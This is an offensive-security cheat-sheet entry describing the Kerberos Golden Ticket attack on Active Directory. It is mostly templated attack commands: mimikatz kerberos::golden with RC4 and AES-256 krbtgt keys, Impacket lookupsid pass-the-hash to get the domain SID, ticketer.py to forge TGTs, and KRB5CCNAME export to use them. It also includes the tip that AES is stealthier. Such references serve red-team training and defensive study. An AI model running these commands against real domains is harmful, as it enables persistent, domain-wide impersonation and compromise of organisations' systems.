---
technique: GoldenTicket
category: kerberos-forged-tickets
targets: Domain (all services)
protocols: Kerberos
remote_capable: true
tags: kerberos golden-ticket krbtgt tgt forged-pac ad persistence
---

# Golden Ticket

The `krbtgt` account's long-term key encrypts the PAC in every TGT in the domain. Knowing that key lets an attacker forge a TGT with an arbitrary PAC claiming membership in Domain Admins and other privileged groups, which is then used with pass-the-ticket to request service tickets for any service in the domain. This requires domain admin privileges first (typically via DCSync to extract the krbtgt hash), so golden tickets are a persistence and lateral movement primitive rather than a privilege escalation. As of the November 2021 updates, the supplied username must exist in Active Directory or the ticket is rejected. Using AES-256 instead of the NT hash is stealthier because it matches the modern default.

## Windows

Mimikatz kerberos::golden forges the TGT and injects it into the current session in one step.

### mimikatz (RC4)

#powershell #mimikatz #tgt

Forge a golden ticket and inject it into the current session using the krbtgt NT hash.

```powershell title:"Forge golden ticket via mimikatz (RC4)"
kerberos::golden /domain:$domain /sid:$domain_sid /rc4:$krbtgt_nt_hash /user:$username /ptt
```
<!-- cheat
var domain
var domain_sid
var krbtgt_nt_hash
var username
-->

### mimikatz (AES)

#powershell #mimikatz #tgt

Forge a golden ticket and inject it into the current session using the krbtgt AES-256 key.

```powershell title:"Forge golden ticket via mimikatz (AES)"
kerberos::golden /domain:$domain /sid:$domain_sid /aes256:$krbtgt_aes256 /user:$username /ptt
```
<!-- cheat
var domain
var domain_sid
var krbtgt_aes256
var username
-->

## Linux

Impacket's lookupsid finds the domain SID and ticketer forges the TGT; the resulting ccache is loaded with KRB5CCNAME.

### lookupsid (get domain SID)

#python #impacket #ldap

Retrieve the domain SID needed to craft the golden ticket PAC.

```sh title:"Retrieve domain SID via Impacket lookupsid"
lookupsid.py -hashes "aad3b435b51404eeaad3b435b51404ee":"$nt_hash" "$domain"/"$user"@"$rhost_ip" 0
```
<!-- cheat
import domain_ip
import users
var dc_ip
var nt_hash
var domain
-->

### ticketer (RC4)

#python #impacket #tgt

Forge a golden TGT using the krbtgt NT hash and save it as a ccache file.

```sh title:"Forge golden ticket via Impacket ticketer (RC4)"
ticketer.py -nthash "$krbtgt_nt_hash" -domain-sid "$domain_sid" -domain "$domain" "$username"
```
<!-- cheat
import domain_ip
var krbtgt_nt_hash
var domain_sid
var domain
var username
-->

### ticketer (AES)

#python #impacket #tgt

Forge a golden TGT using the krbtgt AES-256 key and save it as a ccache file.

```sh title:"Forge golden ticket via Impacket ticketer (AES)"
ticketer.py -aesKey "$krbtgt_aes256" -domain-sid "$domain_sid" -domain "$domain" "$username"
```
<!-- cheat
import domain_ip
var krbtgt_aes256
var domain_sid
var domain
var username
-->

### export KRB5CCNAME (ticketer)

#shell #env

Set KRB5CCNAME to the ccache written by ticketer.py so subsequent Kerberos tools use the forged ticket.

```sh title:"Load ticketer.py ccache into KRB5CCNAME"
export KRB5CCNAME="$username.ccache"
```
<!-- cheat
var username
-->
